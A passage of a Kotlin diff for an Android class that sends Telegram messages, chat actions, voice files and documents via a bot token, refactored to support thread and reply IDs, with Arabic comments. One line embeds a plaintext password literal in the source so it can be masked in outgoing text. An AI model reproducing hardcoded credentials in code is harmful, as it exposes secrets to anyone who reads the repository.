+        replyToMessageId: Long = 0L
+    ): Any? {
         if (tg == null) return null
         return try {
             // ✅ الاستدعاء المباشر والآمن للدوال الداخلية بدلاً من الانعكاس المعقد للدوال المعلقة
@@ -1004,7 +1346,14 @@ class Commands private constructor(context: Context) {
                     val chatId = params["chat_id"] as? Long ?: return null
                     val text = params["text"] as? String ?: ""
                     val replyMarkup = params["reply_markup"] as? String
-                    return tg.sendMessageDirect(receivingToken, chatId, text, replyMarkup)
+                    return tg.sendMessageDirect(
+                        token = receivingToken,
+                        chatId = chatId,
+                        text = text,
+                        replyMarkup = replyMarkup,
+                        threadId = threadId,
+                        replyToMessageId = replyToMessageId
+                    )
                 }
                 if (method == "answerCallbackQuery" && receivingToken != null) {
                     val cbId = params["callback_query_id"] as? String ?: return null
@@ -1039,22 +1388,33 @@ class Commands private constructor(context: Context) {
 
     /**
      * إرسال رسالة نصية عبر Telegram (مع منع تسريب كلمة السر)
+     * ✅ تم تعديلها لدعم threadId و replyToMessageId
      */
     private suspend fun sendTelegramMessage(
         tg: Any?,
         chatId: Any,
         text: String,
         replyMarkupJson: String? = null,
-        receivingToken: String? = null
+        receivingToken: String? = null,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
     ): Any? {
         // ✅ استبدال كلمة المرور بـ •••••••• في حال وجودها بالخطأ في النص
         val cleanText = text.replace("Zaen123@123@", "••••••••")
         val params = mutableMapOf<String, Any>("chat_id" to chatId, "text" to cleanText)
         replyMarkupJson?.let { params["reply_markup"] = it }
-        return invokeTelegramMethod(tg, "sendMessage", params, receivingToken)
+        return invokeTelegramMethod(
+            tg, "sendMessage", params,
+            receivingToken, threadId, replyToMessageId
+        )
     }
 
-    private suspend fun sendTelegramAction(tg: Any?, chatId: Any, action: String, receivingToken: String? = null) {
+    private suspend fun sendTelegramAction(
+        tg: Any?,
+        chatId: Any,
+        action: String,
+        receivingToken: String? = null
+    ) {
         val params = mapOf(
             "chat_id" to chatId,
             "action" to action
@@ -1062,7 +1422,12 @@ class Commands private constructor(context: Context) {
         invokeTelegramMethod(tg, "sendChatAction", params, receivingToken)
     }
 
-    private suspend fun sendTelegramVoice(tg: Any?, chatId: Any, voiceFile: File, receivingToken: String? = null): Boolean {
+    private suspend fun sendTelegramVoice(
+        tg: Any?,
+        chatId: Any,
+        voiceFile: File,
+        receivingToken: String? = null
+    ): Boolean {
         if (tg == null) return false
         return try {
             val params = mapOf("chat_id" to chatId)
@@ -1080,7 +1445,13 @@ class Commands private constructor(context: Context) {
         }
     }
 
-    private suspend fun sendTelegramDocument(tg: Any?, chatId: Any, documentFile: File, caption: String, receivingToken: String? = null): Boolean {
+    private suspend fun sendTelegramDocument(
+        tg: Any?,
+        chatId: Any,
+        documentFile: File,
+        caption: String,
+        receivingToken: String? = null
+    ): Boolean {
         if (tg == null) return false
         return try {
             val params = mapOf(
